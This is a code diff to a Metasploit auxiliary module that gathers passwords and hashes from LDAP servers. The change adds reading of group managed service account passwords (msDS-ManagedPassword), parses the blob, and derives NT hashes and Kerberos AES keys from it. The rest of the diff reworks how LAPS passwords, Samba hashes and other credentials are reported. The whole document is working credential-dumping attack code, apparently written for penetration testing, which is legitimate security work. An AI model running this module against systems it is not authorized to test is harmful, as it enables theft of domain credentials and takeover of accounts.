@@ -11,14 +11,16 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::MsGkdi
   include Msf::Exploit::Remote::LDAP
+  include Msf::Exploit::Remote::LDAP::ActiveDirectory
   include Msf::Exploit::Remote::LDAP::Queries
   include Msf::OptionalSession::LDAP
+  include Msf::Util::WindowsCryptoHelpers
 
   include Msf::Exploit::Deprecated
   moved_from 'auxiliary/gather/ldap_hashdump'
 
   LDAP_CAP_ACTIVE_DIRECTORY_OID = '1.2.840.113556.1.4.800'.freeze
-  PASSWORD_ATTRIBUTES = %w[clearpassword mailuserpassword mslaps-password mslaps-encryptedpassword ms-mcs-admpwd password passwordhistory pwdhistory sambalmpassword sambantpassword userpassword userpkcs12]
+  PASSWORD_ATTRIBUTES = %w[clearpassword mailuserpassword msds-managedpassword mslaps-password mslaps-encryptedpassword ms-mcs-admpwd password passwordhistory pwdhistory sambalmpassword sambantpassword userpassword userpkcs12]
 
   def initialize(info = {})
     super(
@@ -27,7 +29,8 @@ class MetasploitModule < Msf::Auxiliary
         'Name' => 'LDAP Password Disclosure',
         'Description' => %q{
           This module will gather passwords and password hashes from a target LDAP server via multiple techniques
-          including Windows LAPS.
+          including Windows LAPS. For best results, run with SSL because some attributes are only readable over
+          encrypted connections.
         },
         'Author' => [
           'Spencer McIntyre', # LAPS updates
@@ -37,7 +40,8 @@ class MetasploitModule < Msf::Auxiliary
         ],
         'References' => [
           ['URL', 'https://blog.xpnsec.com/lapsv2-internals/'],
-          ['URL', 'https://github.com/fortra/impacket/blob/master/examples/GetLAPSPassword.py']
+          ['URL', 'https://github.com/fortra/impacket/blob/master/examples/GetLAPSPassword.py'],
+          ['ATT&CK', Mitre::Attack::Technique::T1003_OS_CREDENTIAL_DUMPING]
         ],
         'DisclosureDate' => '2020-07-23',
         'License' => MSF_LICENSE,
@@ -67,59 +71,6 @@ class MetasploitModule < Msf::Auxiliary
     defined?(:session) && session
   end
 
-  def get_ad_ds_domain_info(ldap)
-    vprint_status('Checking if the target LDAP server is an Active Directory Domain Controller...')
-
-    root_dse = ldap.search(
-      ignore_server_caps: true,
-      base: '',
-      scope: Net::LDAP::SearchScope_BaseObject,
-      attributes: %i[configurationNamingContext supportedCapabilities supportedExtension]
-    )&.first
-
-    unless root_dse[:supportedcapabilities].map(&:to_s).include?(LDAP_CAP_ACTIVE_DIRECTORY_OID)
-      print_status('The target LDAP server is not an Active Directory Domain Controller.')
-      return nil
-    end
-
-    unless root_dse[:supportedextension].include?(Net::LDAP::WhoamiOid)
-      print_status('The target LDAP server is not an Active Directory Domain Controller.')
-      return nil
-    end
-
-    print_status('The target LDAP server is an Active Directory Domain Controller.')
-
-    unless ldap.search(base: '', filter: '(objectClass=domain)').nil?
-      # this *should* never happen unless we're tricked into connecting on a different port but if it does happen it
-      # means we'll be getting information from more than one domain which breaks some core assumptions
-      # see: https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc978012(v=technet.10)
-      fail_with(Msf::Module::Failure::NoTarget, 'The target LDAP server is a Global Catalog.')
-    end
-
-    target_domains = ldap.search(
-      base: root_dse[:configurationnamingcontext].first.to_s,
-      filter: "(&(objectCategory=crossref)(nETBIOSName=*)(nCName=#{ldap.base_dn}))"
-    )
-    unless target_domains.present?
-      fail_with(Msf::Module::Failure::NotFound, 'The target LDAP server did not return its NETBIOS domain name.')
-    end
-
-    unless target_domains.length == 1
-      fail_with(Msf::Module::Failure::NotFound, "The target LDAP server returned #{target_domains.length} NETBIOS domain names.")
-    end
-
-    target_domain = target_domains.first
-
-    {
-      netbios_name: target_domain[:netbiosname].first.to_s,
-      dns_name: target_domain[:dnsroot].first.to_s
-    }
-  end
-
-  def ad_domain?
-    @ad_ds_domain_info.nil?
-  end
-
   # PoC using ldapsearch(1):
   #
   # Retrieve root DSE with base DN:
@@ -147,10 +98,22 @@ class MetasploitModule < Msf::Auxiliary
         vprint_status("Using the '#{datastore['USER_ATTR']}' attribute as the username")
       end
 
-      @ad_ds_domain_info = get_ad_ds_domain_info(ldap)
+      vprint_status('Checking if the target LDAP server is an Active Directory Domain Controller...')
+      if is_active_directory?(ldap)
+        print_status('The target LDAP server is an Active Directory Domain Controller.')
+        @ad_ds_domain_info = adds_get_domain_info(ldap)
+      else
+        print_status('The target LDAP server is not an Active Directory Domain Controller.')
+        @ad_ds_domain_info = nil
+      end
 
       print_status("Searching base DN: #{base_dn}")
       entries_returned += ldap_search(ldap, base_dn, base: base_dn)
+      unless @ad_ds_domain_info.nil?
+        attributes = %w[dn msDS-ManagedPassword sAMAccountName]
+        attributes << datastore['USER_ATTR'] unless datastore['USER_ATTR'].blank? || attributes.include?(datastore['USER_ATTR'])
+        entries_returned += ldap_search(ldap, base_dn, base: base_dn, filter: '(objectClass=msDS-GroupManagedServiceAccount)', attributes: attributes)
+      end
     end
 
     # Safe if server did not return anything
@@ -180,7 +143,7 @@ class MetasploitModule < Msf::Auxiliary
           entries_returned += 1
           password_attributes.each do |attr|
             if entry[attr].any?
-              creds_found += process_hash(entry, attr)
+              creds_found += process_entry(entry, attr)
             end
           end
         end
@@ -226,7 +189,7 @@ class MetasploitModule < Msf::Auxiliary
     hash
   end
 
-  def process_hash(entry, attr)
+  def process_entry(entry, attr)
     creds_found = 0
     username = [datastore['USER_ATTR'], 'sAMAccountName', 'uid', 'dn'].map { entry[_1] }.reject(&:blank?).first.first
 
@@ -267,39 +230,80 @@ class MetasploitModule < Msf::Auxiliary
 
       if attr =~ /^samba(lm|nt)password$/
         next if private_data.length != 32
-        next if private_data.case_cmp?('aad3b435b51404eeaad3b435b51404ee') || private_data.case_cmp?('31d6cfe0d16ae931b73c59d7e0c089c0')
+        next if private_data.case_cmp?(EMPTY_LM.unpack1('H*'))
+        next if private_data.case_cmp?(EMPTY_NT.unpack1('H*'))
       end
 
       # observed sambapassword history with either 56 or 64 zeros
       next if attr == 'sambapasswordhistory' && private_data =~ /^(0{64}|0{56})$/
 
-      jtr_format = nil
-      annotation = ''
+      artifacts = SecretArtifact.new(public_data: username, private_data: private_data, private_type: :password)
 
       case attr
       when 'sambalmpassword'
-        jtr_format = 'lm'
+        artifacts.jtr_format = 'lm'
+        artifacts.private_type = :nonreplayable_hash
       when 'sambantpassword'
-        jtr_format = 'nt'
+        artifacts.jtr_format = 'nt,lm'
+        artifacts.private_type = :ntlm_hash
+        artifacts.private_data = "#{BLANK_LM.unpack('H*')}:#{private_data}"
       when 'sambapasswordhistory'
         # 795471346779677A336879366B654870 1F18DC5E346FDA5E335D9AE207C82CC9
         # where the left part is a salt and the right part is MD5(Salt+NTHash)
         # attribute value may contain multiple concatenated history entries
         # for john sort of 'md5($s.md4(unicode($p)))' - not tested
-        jtr_format = 'sambapasswordhistory'
+        artifacts.jtr_format = 'sambapasswordhistory'
+        artifacts.private_type = :nonreplayable_hash
       when 'krbprincipalkey'
-        jtr_format = 'krbprincipal'
+        artifacts.jtr_format = 'krbprincipal'
+        artifacts.private_type = :nonreplayable_hash
         # TODO: krbprincipalkey is asn.1 encoded string. In case of vmware vcenter 6.7
         # it contains user password encrypted with (23) rc4-hmac and (18) aes256-cts-hmac-sha1-96:
         # https://github.com/vmware/lightwave/blob/d50d41edd1d9cb59e7b7cc1ad284b9e46bfa703d/vmdir/server/common/krbsrvutil.c#L480-L558
         # Salted with principal name:
         # https://github.com/vmware/lightwave/blob/c4ad5a67eedfefe683357bc53e08836170528383/vmdir/thirdparty/heimdal/krb5-crypto/salt.c#L133-L175
         # In the meantime, dump the base64 encoded value.
-        private_data = Base64.strict_encode64(private_data)
+        artifacts.private_data = Base64.strict_encode64(private_data)
       when 'ms-mcs-admpwd'
         # LAPSv1 doesn't store the name of the local administrator anywhere in LDAP. It's technically configurable via Group Policy, but we'll  assume it's 'Administrator'.
-        username = 'Administrator'
-        annotation = "(expires: #{convert_nt_timestamp_to_time_string(entry['ms-mcs-admpwdexpirationtime'].first.to_i)})" if entry['ms-mcs-admpwdexpirationtime'].present?
+        artifacts.public_data = 'Administrator'
+        artifacts.annotation = "(expires: #{convert_nt_timestamp_to_time_string(entry['ms-mcs-admpwdexpirationtime'].first.to_i)})" if entry['ms-mcs-admpwdexpirationtime'].present?
+      when 'msds-managedpassword'
+        managed_password = MsdsManagedpasswordBlob.read(private_data)
+        current_password = managed_password.buffer_fields[:current_password] # this field should always be present
+        if current_password && (domain_dns_name = @ad_ds_domain_info&.fetch(:dns_name))
+          artifacts = []
+          sam_account_name = entry[:sAMAccountName].first.to_s
+
+          salt = "#{domain_dns_name.upcase}host#{sam_account_name.delete_suffix('$').downcase}.#{domain_dns_name.downcase}"
+          encoded_current_password = current_password.force_encoding('UTF-16LE').encode('UTF-8', invalid: :replace, undef: :replace).force_encoding('ASCII-8BIT')
+
+          artifacts << SecretArtifact.new(
+            public_data: username,
+            private_data: "#{EMPTY_LM.unpack1('H*')}:#{OpenSSL::Digest::MD4.digest(current_password).unpack1('H*')}",
+            private_type: :ntlm_hash,
+            jtr_format: 'nt,lm'
+          )
+
+          artifacts << SecretArtifact.new(
+            public_data: username,
+            private_data: Metasploit::Credential::KrbEncKey.build_data(
+              enctype: Rex::Proto::Kerberos::Crypto::Encryption::AES256,
+              key: aes256_cts_hmac_sha1_96(encoded_current_password, salt),
+              salt: salt
+            ),
+            private_type: :krb_enc_key
+          )
+          artifacts << SecretArtifact.new(
+            public_data: username,
+            private_data: Metasploit::Credential::KrbEncKey.build_data(
+              enctype: Rex::Proto::Kerberos::Crypto::Encryption::AES128,
+              key: aes128_cts_hmac_sha1_96(encoded_current_password, salt),
+              salt: salt
+            ),
+            private_type: :krb_enc_key
+          )
+        end
       when 'mslaps-password'
         begin
           lapsv2 = JSON.parse(private_data)
@@ -309,34 +313,35 @@ class MetasploitModule < Msf::Auxiliary
           next
         end
 
-        username = lapsv2['n']
-        private_data = lapsv2['p']
-        annotation = "(expires: #{convert_nt_timestamp_to_time_string(entry['mslaps-passwordexpirationtime'].first.to_i)})" if entry['mslaps-passwordexpirationtime'].present?
+        artifacts.public_data = lapsv2['n']
+        artifacts.private_data = lapsv2['p']
+        artifacts.annotation = "(expires: #{convert_nt_timestamp_to_time_string(entry['mslaps-passwordexpirationtime'].first.to_i)})" if entry['mslaps-passwordexpirationtime'].present?
       when 'mslaps-encryptedpassword'
         lapsv2 = process_result_lapsv2_encrypted(entry)
         next if lapsv2.nil?
 
-        username = lapsv2['n']
-        private_data = lapsv2['p']
-        annotation = "(expires: #{convert_nt_timestamp_to_time_string(entry['mslaps-passwordexpirationtime'].first.to_i)})" if entry['mslaps-passwordexpirationtime'].present?
+        artifacts.username = lapsv2['n']
+        artifacts.private_data = lapsv2['p']
+        artifacts.annotation = "(expires: #{convert_nt_timestamp_to_time_string(entry['mslaps-passwordexpirationtime'].first.to_i)})" if entry['mslaps-passwordexpirationtime'].present?
       when 'userpkcs12'
-        # if we get non printable chars, encode into base64
+        # if we get non-printable chars, encode into base64
         if (private_data =~ /[^[:print:]]/).nil?
-          jtr_format = 'pkcs12'
+          artifacts.jtr_format = 'pkcs12'
         else
-          jtr_format = 'pkcs12-base64'
-          private_data = Base64.strict_encode64(private_data)
+          artifacts.jtr_format = 'pkcs12-base64'
+          artifacts.private_data = Base64.strict_encode64(private_data)
         end
+        artifacts.private_type = :nonreplayable_hash
       else
         if private_data.start_with?(/{crypt}.?\$1\$/i)
-          private_data.gsub!(/{crypt}.{,2}\$1\$/i, '$1$')
-          jtr_format = 'md5crypt'
+          artifacts.private_data.gsub!(/{crypt}.{,2}\$1\$/i, '$1$')
+          artifacts.jtr_format = 'md5crypt'
         elsif private_data.start_with?(/{crypt}/i) && private_data.length == 20
           # handle {crypt}traditional_crypt case, i.e. explicitly set the hash format
-          private_data.slice!(/{crypt}/i)
+          artifacts.private_data.slice!(/{crypt}/i)
           # FIXME: what is the right jtr_hash - des,crypt or descrypt ?
           # identify_hash returns des,crypt, while JtR acceppts descrypt
-          jtr_format = 'descrypt'
+          artifacts.jtr_format = 'descrypt'
         # TODO: not sure if we shall slice the prefixes here or in the JtR/Hashcat formatter
         # elsif hash.start_with?(/{sha256}/i)
         #  hash.slice!(/{sha256}/i)
@@ -345,27 +350,51 @@ class MetasploitModule < Msf::Auxiliary
           # handle vcenter vmdir binary hash format
           if private_data[0].ord == 1 && private_data.length == 81
             _type, private_data, salt = private_data.unpack('CH128H32')
-            private_data = "$dynamic_82$#{private_data}$HEX$#{salt}"
+            artifacts.private_data = "$dynamic_82$#{private_data}$HEX$#{salt}"
           else
             # Remove LDAP's {crypt} prefix from known hash types
-            private_data.gsub!(/{crypt}.{,2}(\$[0256][aby]?\$)/i, '\1')
+            artifacts.private_data.gsub!(/{crypt}.{,2}(\$[0256][aby]?\$)/i, '\1')
           end
-          jtr_format = Metasploit::Framework::Hashes.identify_hash(private_data)
+          artifacts.jtr_format = Metasploit::Framework::Hashes.identify_hash(artifacts.private_data)
         end
+        artifacts.private_type = :nonreplayable_hash
       end
 
-      # highlight unresolved hashes
-      jtr_format = '{crypt}' if private_data =~ /{crypt}/i
-      print_good("Credentials (#{jtr_format.blank? ? 'password' : jtr_format}) found in #{attr}: #{username}:#{private_data} #{annotation}")
+      Array.wrap(artifacts).each do |artifact|
+        # highlight unresolved hashes
+        artifact.jtr_format = '{crypt}' if artifact.private_data =~ /{crypt}/i
 
-      report_creds(username, private_data, jtr_format)
+        case artifact.private_type
+        when :krb_enc_key
+          _, enctype, key, salt = artifact.private_data.split(':')
+          formatted = "#{artifact.public_data}:#{Rex::Proto::Kerberos::Crypto::Encryption::IANA_NAMES[enctype.to_i]}:#{key}"
+        when :password
+          formatted = "#{artifact.public_data}:#{artifact.private_data}"
+        else
+          formatted = Metasploit::Framework::PasswordCracker::JtR::Formatter.params_to_jtr(
+            artifact.public_data,
+            artifact.private_data,
+            artifact.private_type,
+            format: artifact.jtr_format
+          )
+          if formatted.nil?
+            formatted = "#{artifact.public_data}:#{artifact.private_data}"
+          end
+        end
+        print_good("Credential found in #{attr}: #{formatted} #{artifact.annotation}")
+
+        report_creds(artifact.public_data, artifact.private_data, artifact.private_type, artifact.jtr_format)
+      end
+
+      # only increment once because the iteration is per-attribute so report one credential found even if it's reported
+      # in multiple formats
       creds_found += 1
     end
 
     creds_found
   end
 
-  def report_creds(username, private_data, jtr_format)
+  def report_creds(username, private_data, private_type, jtr_format)
     # this is the service the credentials came from, not necessarily where they can be used
     service_data = {
       address: rhost,
@@ -380,7 +409,7 @@ class MetasploitModule < Msf::Auxiliary
       origin_type: :service,
       status: Metasploit::Model::Login::Status::UNTRIED,
       private_data: private_data,
-      private_type: (jtr_format.nil? ? :password : :nonreplayable_hash),
+      private_type: private_type,
       jtr_format: jtr_format,
       username: username
     }.merge(service_data)
@@ -390,8 +419,7 @@ class MetasploitModule < Msf::Auxiliary
       credential_data[:realm_value] = @ad_ds_domain_info[:dns_name]
     end
 
-    cl = create_credential_and_login(credential_data)
-    cl.respond_to?(:core_id) ? cl.core_id : nil
+    create_credential_and_login(credential_data)
   end
 
   def process_result_lapsv2_encrypted(result)
@@ -465,6 +493,8 @@ class MetasploitModule < Msf::Auxiliary
     JSON.parse(RubySMB::Field::Stringz16.read(plaintext).value)
   end
 
+  SecretArtifact = Struct.new(:public_data, :private_data, :private_type, :jtr_format, :annotation)
+
   # https://blog.xpnsec.com/lapsv2-internals/#:~:text=msLAPS%2DEncryptedPassword%20attribute
   # https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada2/b6ea7b78-64da-48d3-87cb-2cff378e4597
   class LAPSv2EncryptedPasswordBlob < BinData::Record
@@ -494,5 +524,48 @@ class MetasploitModule < Msf::Auxiliary
       objectid(:key_attr_id),
       model(:key_attr, Sequence)
     ]
+  end
+
+  # this is a partial implementation, processing the buffer and the fields is simplified to only support reading
+  # see: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e
+  class MsdsManagedpasswordBlob < BinData::Record
+    endian :little
+    hide   :reserved
+
+    uint16 :version
+    uint16 :reserved
+    uint32 :blob_length
+    uint16 :current_password_offset
+    uint16 :previous_password_offset
+    uint16 :query_password_interval_offset
+    uint16 :unchanged_password_interval_offset
+
+    count_bytes_remaining :bytes_remaining
+    string :buffer, read_length: -> { bytes_remaining }
+
+    def buffer_fields
+      boffset = offset_of(buffer)
+      bfield_offsets = {
+        current_password: current_password_offset,
+        previous_password: previous_password_offset,
+        query_password_interval: query_password_interval_offset,
+        unchanged_password_interval: unchanged_password_interval_offset
+      }.sort_by { |_field, offset| offset }
+
+      bfields = {}
+      bfield_offsets.each_cons(2) do |(field, offset), (_, next_offset)|
+        next if offset == 0
+
+        bfields[field] = buffer[(offset - boffset)..(next_offset - boffset)]
+      end
+      last_field, last_offset = bfield_offsets.last
+      bfields[last_field] = buffer[(last_offset - boffset)..] if last_offset != 0
+
+      bfields[:current_password] = bfields[:current_password].split("\x00\x00".b).first if bfields[:current_password]
+      bfields[:previous_password] = bfields[:previous_password].split("\x00\x00".b).first if bfields[:previous_password]
+      bfields[:query_password_interval] = bfields[:query_password_interval].unpack1('Q<') if bfields[:query_password_interval]
+      bfields[:unchanged_password_interval] = bfields[:unchanged_password_interval].unpack1('Q<') if bfields[:unchanged_password_interval]
+      bfields
+    end
   end
 end
